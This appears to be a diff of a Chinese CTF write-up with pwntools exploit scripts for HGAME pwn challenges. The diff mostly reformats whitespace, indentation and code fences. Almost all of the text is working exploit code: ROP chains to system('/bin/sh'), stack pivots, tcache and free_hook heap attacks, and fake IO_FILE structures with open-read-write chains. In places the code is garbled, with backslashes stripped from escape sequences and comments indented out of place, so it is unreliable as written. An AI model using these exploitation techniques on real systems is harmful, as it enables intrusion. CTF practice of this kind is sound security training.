@@ -7,7 +7,7 @@
 
 admin@chamd5.org(带上简历和想加入的小组)
 
-week1 
+week1
 
 format
 
@@ -50,10 +50,10 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc.so.6') 
+libc=ELF('./libc.so.6')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',31079)
@@ -81,7 +81,7 @@ sleep(0.01)
 payload=b'a'*(0xc+1)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)
 s(payload)
 
-inter()	
+inter()
 
 counting petals
 
@@ -122,10 +122,10 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc.so.6') 
+libc=ELF('./libc.so.6')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',30656)
@@ -189,7 +189,7 @@ pay(system)
 rl("Reply 1 indicates the former and 2 indicates the latter: ")
 sl(str(1))
 
-inter()	
+inter()
 
 ezstack
 
@@ -234,8 +234,8 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')
 
@@ -257,7 +257,7 @@ payload=b'a'*(0x50)+p64(bss)+p64(read)
 s(payload)
 sleep(0.01)
 pay2 =(p64(rsi_r15)+p64(elf.got['read'])*2+p64(elf.plt['write'])+p64(0x4013D2)).ljust(0x50,b'x00')
-pay2+=p64(0x404104-8)+p64(leave_ret) 
+pay2+=p64(0x404104-8)+p64(leave_ret)
 #bug()
 s(pay2)
 
@@ -328,9 +328,9 @@ orw += p64(write)+b'/flagx00x00x00'
 
 sl(orw)
 '''
-inter()	
+inter()
 
- week2 
+ week2
 
 Hit list
 
@@ -389,10 +389,10 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc.so.6') 
+libc=ELF('./libc.so.6')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',32272)
@@ -425,15 +425,15 @@ def edit(i,name,size,content):
 	sl(str(size))
 	rl(">")
 	s(content)
-	
-	
+
+
 def show(i):
 	rl(">")
 	sl(str(4))
 	rl(">")
 	sl(str(i))
 
-	
+
 
 add(0,0x68,b'a')
 add(1,0x68,b'a')
@@ -518,7 +518,7 @@ add(27,0x68,b'x00'*8+p64(chunk3))
 
 rl(">")
 sl(str(5))
-inter()	
+inter()
 
 Where is the vulnerability
 
@@ -571,10 +571,10 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc.so.6') 
+libc=ELF('./libc.so.6')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',31346)
@@ -586,7 +586,7 @@ def add(i,size):
 	sl(str(i))
 	rl("Size: ")
 	sl(str(size))
-	
+
 def free(i):
 	rl("5. Exit")
 	sl(str(2))
@@ -646,10 +646,10 @@ chunk3=heap_base+0xd20 # 伪造的fake_IO结构体的地址
 
 _IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
 
-fake_IO_FILE =p64(0)*2+p64(1)+p64(chunk3+0x8) 
-fake_IO_FILE =fake_IO_FILE.ljust(0x60,b'x00') 
+fake_IO_FILE =p64(0)*2+p64(1)+p64(chunk3+0x8)
+fake_IO_FILE =fake_IO_FILE.ljust(0x60,b'x00')
 fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi
-fake_IO_FILE +=p64(heap_base) 
+fake_IO_FILE +=p64(heap_base)
 fake_IO_FILE +=p64(0x100) #rdx
 fake_IO_FILE =fake_IO_FILE.ljust(0x90, b'x00')
 fake_IO_FILE +=p64(chunk3+0x8) #_wide_data,rax1_addr
@@ -667,7 +667,7 @@ sl(str(5))
 
 sleep(0.1)
 
-orw = p64(rdi) + p64(heap_base+0xea0) 
+orw = p64(rdi) + p64(heap_base+0xea0)
 orw += p64(rsi) + p64(0)
 orw += p64(rax)+p64(2)+p64(syscall)
 
@@ -679,7 +679,7 @@ orw += p64(rsi)+p64(heap_base+0x100)
 orw += p64(write)+b'./flagx00x00'
 sl(orw)
 
-inter()	
+inter()
 
 signin2Heap
 
@@ -732,10 +732,10 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+#context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc-2.27.so') 
+libc=ELF('./libc-2.27.so')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',31701)
@@ -822,7 +822,7 @@ ChaMd5 Venom 招收大佬入圈
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
 	gdb.attach(p)
@@ -837,7 +837,7 @@ def sla(a,b):
 	p.sendlineafter(a,b)
 def r(a):
 	p.recv(a)
-#def pr(a):
+    #def pr(a):
 	#print(p.recv(a))
 def rl(a):
 	return p.recvuntil(a)
@@ -854,14 +854,14 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc.so.6') 
+libc=ELF('./libc.so.6')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',31079)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 def cmd(a):
 	rl("type something:")
@@ -879,22 +879,17 @@ system,bin_sh=get_sb()
 rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
 
 rl(" n = ")
-#bug()
+    #bug()
 s(str(-1))
 sleep(0.01)
 payload=b'a'*(0xc+1)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)
 s(payload)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
 	gdb.attach(p)
@@ -909,7 +904,7 @@ def sla(a,b):
 	p.sendlineafter(a,b)
 def r(a):
 	p.recv(a)
-#def pr(a):
+    #def pr(a):
 	#print(p.recv(a))
 def rl(a):
 	return p.recvuntil(a)
@@ -926,14 +921,14 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc.so.6') 
+libc=ELF('./libc.so.6')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',30656)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 rl("nHow many flowers have you prepared this time?")
 sl(str(16))
@@ -943,11 +938,11 @@ for i in range(14):
 	rl(" : ")
 	sl(str(i+1))
 rl(" : ")
-#bug()
+    #bug()
 sl(str(15))
 
 rl(" : ")
-#bug()
+    #bug()
 sl(str(0x0000001000000015))
 for i in range(5):
 	rl(" : ")
@@ -972,11 +967,11 @@ for i in range(14):
 	rl(" : ")
 	sl(str(i+1))
 rl(" : ")
-#bug()
+    #bug()
 sl(str(15))
 
 rl(" : ")
-#bug()
+    #bug()
 sl(str(0x0000001000000016))
 for i in range(2):
 	rl(" : ")
@@ -994,15 +989,10 @@ rl("Reply 1 indicates the former and 2 indicates the latter: ")
 sl(str(1))
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
 	gdb.attach(p)
@@ -1017,7 +1007,7 @@ def sla(a,b):
 	p.sendlineafter(a,b)
 def r(a):
 	p.recv(a)
-#def pr(a):
+    #def pr(a):
 	#print(p.recv(a))
 def rl(a):
 	return p.recvuntil(a)
@@ -1034,14 +1024,14 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')
 
 elf=ELF('./pwn')
-#p = process('./pwn')
-#p=remote('127.0.0.1',9999)
+    #p = process('./pwn')
+    #p=remote('127.0.0.1',9999)
 p=remote('node1.hgame.vidar.club',31421)
 rdi=0x0000000000401713
 rsi_r15=0x0000000000401711
@@ -1053,12 +1043,12 @@ rbp=0x000000000040135d
 rl("Good luck.n")
 
 payload=b'a'*(0x50)+p64(bss)+p64(read)
-#bug()
+    #bug()
 s(payload)
 sleep(0.01)
 pay2 =(p64(rsi_r15)+p64(elf.got['read'])*2+p64(elf.plt['write'])+p64(0x4013D2)).ljust(0x50,b'x00')
-pay2+=p64(0x404104-8)+p64(leave_ret) 
-#bug()
+pay2+=p64(0x404104-8)+p64(leave_ret)
+    #bug()
 s(pay2)
 
 libc_base=get_addr64()-libc.sym['read']
@@ -1077,7 +1067,7 @@ mprotect=libc_base + libc.sym['mprotect']
 
 rl("Good luck.n")
 pay3=(p64(rsi)+p64(0x404530)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(0x4013D2)+b'/flagx00x00x00').ljust(0x50,b'x00')+p64(0x4040dc-8)+p64(leave_ret)
-#bug()
+    #bug()
 s(pay3)
 
 sleep(0.1)
@@ -1101,7 +1091,7 @@ sleep(0.1)
 
 payload=b'a'*(0x50)+p64(0x404530)+p64(leave_ret)
 
-#bug()
+    #bug()
 s(payload)
 
 '''
@@ -1129,15 +1119,10 @@ orw += p64(write)+b'/flagx00x00x00'
 sl(orw)
 '''
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
 	gdb.attach(p)
@@ -1152,7 +1137,7 @@ def sla(a,b):
 	p.sendlineafter(a,b)
 def r(a):
 	p.recv(a)
-#def pr(a):
+    #def pr(a):
 	#print(p.recv(a))
 def rl(a):
 	return p.recvuntil(a)
@@ -1169,14 +1154,14 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc.so.6') 
+libc=ELF('./libc.so.6')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',32272)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 def add(i,size,content):
 	rl(">")
@@ -1205,15 +1190,15 @@ def edit(i,name,size,content):
 	sl(str(size))
 	rl(">")
 	s(content)
-	
-	
+
+
 def show(i):
 	rl(">")
 	sl(str(4))
 	rl(">")
 	sl(str(i))
 
-	
+
 
 add(0,0x68,b'a')
 add(1,0x68,b'a')
@@ -1258,7 +1243,7 @@ write=libc_base + libc.sym['write']
 add(23,0x40,b'a')#17
 add(24,0x100,b'x00'*0x30+p64(0x81)+b'a'*8)
 
-#add(25,-10,hex(heap_base+0x950))
+    #add(25,-10,hex(heap_base+0x950))
 rl(">")
 sl(str(1))
 rl(">")
@@ -1299,23 +1284,13 @@ add(27,0x68,b'x00'*8+p64(chunk3))
 rl(">")
 sl(str(5))
 inter()
-```
-
-
-
-```
 patchelf --replace-needed libc.so.6 路径 文件
 patchelf --replace-needed libhgame.so 路径 文件
 patchelf --set-interpreter ./ld-2.23.so 路径 文件
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
 	gdb.attach(p)
@@ -1330,7 +1305,7 @@ def sla(a,b):
 	p.sendlineafter(a,b)
 def r(a):
 	p.recv(a)
-#def pr(a):
+    #def pr(a):
 	#print(p.recv(a))
 def rl(a):
 	return p.recvuntil(a)
@@ -1347,14 +1322,14 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc.so.6') 
+libc=ELF('./libc.so.6')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',31346)
-#p = process('./pwn')
+    #p = process('./pwn')
 def add(i,size):
 	rl("5. Exit")
 	sl(str(1))
@@ -1362,7 +1337,7 @@ def add(i,size):
 	sl(str(i))
 	rl("Size: ")
 	sl(str(size))
-	
+
 def free(i):
 	rl("5. Exit")
 	sl(str(2))
@@ -1397,7 +1372,7 @@ setcontext=libc_base+libc.sym['setcontext']
 rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
 rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
 rdx = libc_base+0x0000000000066b9a
-#rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
+    #rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
 rax = libc_base+libc.search(asm("pop raxnret")).__next__()
 ret = libc_base+libc.search(asm("ret")).__next__()
 syscall=libc_base+libc.search(asm("syscallnret")).__next__()
@@ -1422,10 +1397,10 @@ chunk3=heap_base+0xd20 # 伪造的fake_IO结构体的地址
 
 _IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
 
-fake_IO_FILE =p64(0)*2+p64(1)+p64(chunk3+0x8) 
-fake_IO_FILE =fake_IO_FILE.ljust(0x60,b'x00') 
+fake_IO_FILE =p64(0)*2+p64(1)+p64(chunk3+0x8)
+fake_IO_FILE =fake_IO_FILE.ljust(0x60,b'x00')
 fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi
-fake_IO_FILE +=p64(heap_base) 
+fake_IO_FILE +=p64(heap_base)
 fake_IO_FILE +=p64(0x100) #rdx
 fake_IO_FILE =fake_IO_FILE.ljust(0x90, b'x00')
 fake_IO_FILE +=p64(chunk3+0x8) #_wide_data,rax1_addr
@@ -1437,13 +1412,13 @@ fake_IO_FILE +=p64(read)
 
 edit(2,fake_IO_FILE)
 
-#bug()
+    #bug()
 rl("5. Exit")
 sl(str(5))
 
 sleep(0.1)
 
-orw = p64(rdi) + p64(heap_base+0xea0) 
+orw = p64(rdi) + p64(heap_base+0xea0)
 orw += p64(rsi) + p64(0)
 orw += p64(rax)+p64(2)+p64(syscall)
 
@@ -1456,15 +1431,10 @@ orw += p64(write)+b'./flagx00x00'
 sl(orw)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
 	gdb.attach(p)
@@ -1479,7 +1449,7 @@ def sla(a,b):
 	p.sendlineafter(a,b)
 def r(a):
 	p.recv(a)
-#def pr(a):
+    #def pr(a):
 	#print(p.recv(a))
 def rl(a):
 	return p.recvuntil(a)
@@ -1496,14 +1466,14 @@ def get_hook():
 li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
- 
-#context(os='linux',arch='i386',log_level='debug') 
+
+    #context(os='linux',arch='i386',log_level='debug')
 context(os='linux',arch='amd64',log_level='debug')
-libc=ELF('./libc-2.27.so') 
+libc=ELF('./libc-2.27.so')
 
 elf=ELF('./pwn')
 p=remote('node1.hgame.vidar.club',31701)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 def add(i,size,content):
 	rl("Your choice:")
@@ -1539,7 +1509,7 @@ free(7)
 add(11,0x88,b'a'*0x80+p64(0x90+0x100))
 
 free(9)
-#bug()
+    #bug()
 for i in range(7):
  add(i,0xf8,"/bin/shx00")
 add(7,0xf8,"cccc")
@@ -1566,7 +1536,7 @@ add(14,0xb8,b'x00'*0x60+p64(0x100)+p64(0x90)+p64(free_hook))
 add(0,0x88,b'/bin/shx00')
 add(1,0x88,p64(system))
 
-#bug()
+    #bug()
 free(0)
 
 inter()
